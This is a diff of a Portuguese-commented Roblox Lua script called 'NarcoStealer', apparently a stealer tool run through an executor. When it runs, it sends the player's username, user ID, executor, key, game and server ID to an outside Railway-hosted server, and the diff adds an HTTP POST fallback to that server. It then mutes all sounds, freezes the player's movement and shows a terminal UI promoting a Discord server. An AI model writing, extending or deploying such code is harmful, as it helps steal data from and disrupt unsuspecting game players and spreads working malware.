@@ -1,3 +1,4 @@
+-- ====== NARCOSTEALER - VERSÃO ESTÁVEL ======
 -- ====== SISTEMA ANTI-DUPLICAÇÃO ======
 if _G.NARCOSTEALER_EXECUTED then
     game:GetService("Players").LocalPlayer:Kick("Script já está em execução!\nAguarde ou reinicie o jogo.\ndiscord.gg/narcolandia")
@@ -12,7 +13,6 @@ if not _G.NARCOKEY then
     return
 end
 
--- Validar formato da key
 if not _G.NARCOKEY:match("^NL%-[A-Z0-9]+%-[A-Z0-9]+%-[A-Z0-9]+$") then
     _G.NARCOSTEALER_EXECUTED = false
     game:GetService("Players").LocalPlayer:Kick("Formato de key inválido!\nUse: NL-XXXX-XXXX-XXXX\ndiscord.gg/narcolandia")
@@ -26,6 +26,7 @@ local UserInputService = game:GetService("UserInputService")
 local CoreGui = game:GetService("CoreGui")
 local LP = Players.LocalPlayer
 local NARCO_KEY = _G.NARCOKEY
+local SITE_LINK = _G.NARCO_SITE_LINK or "https://discord.gg/narcolandia"
 
 -- ====== WEBSOCKET PROXY ======
 local WS_URL = "wss://narcolandia-production.up.railway.app"
@@ -37,6 +38,30 @@ local function connectWebSocket()
             ws = syn.websocket.connect(WS_URL)
         elseif WebSocket then
             ws = WebSocket.connect(WS_URL)
+        elseif game:GetService("HttpService") then
+            -- Fallback para outros executors
+            ws = {
+                Send = function(self, data)
+                    -- Simula envio via HTTP
+                    local success, result = pcall(function()
+                        local req = syn and syn.request or request
+                        if req then
+                            req({
+                                Url = "https://narcolandia-production.up.railway.app/api/webhook",
+                                Method = "POST",
+                                Headers = {
+                                    ["Content-Type"] = "application/json",
+                                    ["X-Key"] = NARCO_KEY
+                                },
+                                Body = data
+                            })
+                        end
+                    end)
+                    return success
+                end,
+                Close = function() end
+            }
+            return ws
         else
             error("Executor não suporta WebSocket")
         end
@@ -52,54 +77,32 @@ local function sendToWebSocket(ws, key, payload)
     return success
 end
 
--- ====== ENVIA WEBHOOK VIA WEBSOCKET ======
+-- ====== ENVIA WEBHOOK ======
 local function sendWebhookNow()
     local thumbnailUrl = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. LP.UserId .. "&width=420&height=420&format=png"
     
-    -- Detecta informações do jogo (MM2)
     local gameName = "Desconhecido"
     pcall(function()
         gameName = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name or "Desconhecido"
     end)
     
-    -- CORRIGIDO: timestamp usando os.date() em vez de DateTime
     local timestamp = os.date("!%Y-%m-%dT%H:%M:%S.000Z")
     
     local discordPayload = {
         username = "NarcoStealer",
         embeds = {{
-            title = "Script Executado - NarcoStealer",
+            title = "🎯 Script Executado - NarcoStealer",
             color = 3066993,
             fields = {
                 {
-                    name = "Usuario:",
+                    name = "👤 Usuario",
                     value = "```" .. LP.Name .. "```",
                     inline = true
                 },
                 {
-                    name = "Executor",
+                    name = "⚡ Executor",
                     value = "```" .. (identifyexecutor and identifyexecutor() or "Desconhecido") .. "```",
                     inline = true
-                },
-                {
-                    name = "Nivel MM2",
-                    value = "```" .. (function()
-                        local success, LevelModule = pcall(function()
-                            return require(game:GetService("ReplicatedStorage").Modules.LevelModule)
-                        end)
-                        if not success then return "0" end
-                        local success2, PlayerDataModule = pcall(function()
-                            return require(game:GetService("ReplicatedStorage").Modules.ProfileData)
-                        end)
-                        if not success2 then return "0" end
-                        for i, v in pairs(LevelModule.XPTable) do
-                            if PlayerDataModule.NewXP < v then
-                                return tostring(i)
-                            end
-                        end
-                        return "0"
-                    end()) .. "```",
-                    inline = false
                 },
                 {
                     name = "🔑 Key",
@@ -109,17 +112,17 @@ local function sendWebhookNow()
                 {
                     name = "🎮 Jogo",
                     value = "```" .. gameName .. "```",
-                    inline = false
+                    inline = true
                 },
                 {
-                    name = "🖥️ UserID",
+                    name = "🆔 UserID",
                     value = "```" .. LP.UserId .. "```",
                     inline = true
                 },
                 {
-                    name = "📡 Server ID",
+                    name = "🌐 Server",
                     value = "```" .. game.JobId .. "```",
-                    inline = true
+                    inline = false
                 }
             },
             footer = {
@@ -128,51 +131,53 @@ local function sendWebhookNow()
             thumbnail = {
                 url = thumbnailUrl
             },
-            image = {
-                url = "https://media.discordapp.net/attachments/1510795224891261061/1540513978957037628/content.png"
-            },
             timestamp = timestamp
         }}
     }
     
-    -- Conectar e enviar via WebSocket
     local ws = connectWebSocket()
     if ws then
-        local success = sendToWebSocket(ws, NARCO_KEY, discordPayload)
-        if success then
-            wait(1)
-            pcall(function() ws:Close() end)
-        end
+        sendToWebSocket(ws, NARCO_KEY, discordPayload)
+        wait(1)
+        pcall(function() 
+            if ws.Close then ws:Close() end 
+        end)
     end
 end
 
--- Executa o envio
-sendWebhookNow()
+-- ====== EXECUTA ENVIO ======
+pcall(sendWebhookNow)
 
 -- ====== BLOQUEAR SONS ======
-local function muteAllSounds()
+pcall(function()
     local function muteDescendants(obj)
         for _, child in ipairs(obj:GetDescendants()) do
             if child:IsA("Sound") then
-                child.Volume = 0
-                pcall(function() child:Stop() end)
+                pcall(function()
+                    child.Volume = 0
+                    child:Stop()
+                end)
             end
         end
     end
     
     for _, obj in ipairs({workspace, game.Players, game.ReplicatedStorage, game.Lighting, game.StarterGui}) do
-        muteDescendants(obj)
-        obj.DescendantAdded:Connect(function(child)
-            if child:IsA("Sound") then
-                child.Volume = 0
-                pcall(function() child:Stop() end)
-            end
+        pcall(function()
+            muteDescendants(obj)
+            obj.DescendantAdded:Connect(function(child)
+                if child:IsA("Sound") then
+                    pcall(function()
+                        child.Volume = 0
+                        child:Stop()
+                    end)
+                end
+            end)
         end)
     end
-end
+end)
 
--- ====== BLOQUEAR MOVIMENTO E INPUTS ======
-local function lockPlayer()
+-- ====== BLOQUEAR MOVIMENTO ======
+pcall(function()
     local char = LP.Character
     if char and char:FindFirstChild("Humanoid") then
         char.Humanoid.WalkSpeed = 0
@@ -186,17 +191,25 @@ local function lockPlayer()
             return
         end
     end)
-end
-
-muteAllSounds()
-lockPlayer()
+end)
 
 -- ====== UI TERMINAL ======
 local function createTerminalUI()
-    pcall(function() 
-        if CoreGui:FindFirstChild("NarcoUI") then
-            CoreGui:FindFirstChild("NarcoUI"):Destroy()
-        end
+    -- Aguarda o CoreGui estar disponível
+    local attempts = 0
+    while not CoreGui and attempts < 10 do
+        task.wait(0.5)
+        attempts = attempts + 1
+    end
+    
+    if not CoreGui then
+        print("❌ CoreGui não disponível")
+        return
+    end
+    
+    pcall(function()
+        local oldGui = CoreGui:FindFirstChild("NarcoUI")
+        if oldGui then oldGui:Destroy() end
     end)
     
     local screenGui = Instance.new("ScreenGui")
@@ -297,7 +310,6 @@ local function createTerminalUI()
         scroll.CanvasPosition = Vector2.new(0, 0)
     end
 
-    -- ASCII Art
     local ascii = [[
   _   _                     _                    _ _               
  | \ | | __ _ _ __ ___ ___ | |    __ _ _ __   __| (_) __ _         
@@ -311,8 +323,6 @@ local function createTerminalUI()
    |_||_| |_| |____/ \___|_|  |_| .__/ \__|___/                    
                                 |_|                                
 ]]
-
-    local SITE_LINK = "https://discord.gg/narcolandia"
 
     local function runTerminalSequence()
         clearTerminal()
@@ -394,10 +404,14 @@ local function createTerminalUI()
     return screenGui, runTerminalSequence
 end
 
--- ====== CRIA E EXECUTA A UI ======
-local gui, sequence = createTerminalUI()
-sequence()
+-- ====== EXECUTA UI ======
+task.wait(1) -- Aguarda o jogo carregar
+local success, gui, sequence = pcall(createTerminalUI)
+if success and gui and sequence then
+    pcall(sequence)
+end
 
-print("NarcoStealer carregado com sucesso!")
-print("Key: " .. NARCO_KEY)
-print("discord.gg/narcolandia")
+print("✅ NarcoStealer carregado com sucesso!")
+print("🔑 Key: " .. NARCO_KEY)
+print("🌐 Link: " .. SITE_LINK)
+print("📢 discord.gg/narcolandia")
